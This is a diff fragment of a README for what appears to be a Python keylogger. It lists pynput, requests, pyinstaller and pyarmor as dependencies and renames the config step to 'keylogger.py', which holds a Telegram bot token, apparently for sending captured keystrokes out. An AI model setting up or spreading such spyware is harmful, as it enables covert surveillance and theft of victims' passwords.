@@ -39,7 +39,7 @@ pip install pynput requests pyinstaller pyarmor
 
 1. Clone or download the repository.
 
-2. Create or edit the `config.py` file:
+2. Create or edit the `keylogger.py` file:
 
    ```python
    TELEGRAM_BOT_TOKEN = 'your-bot-token'
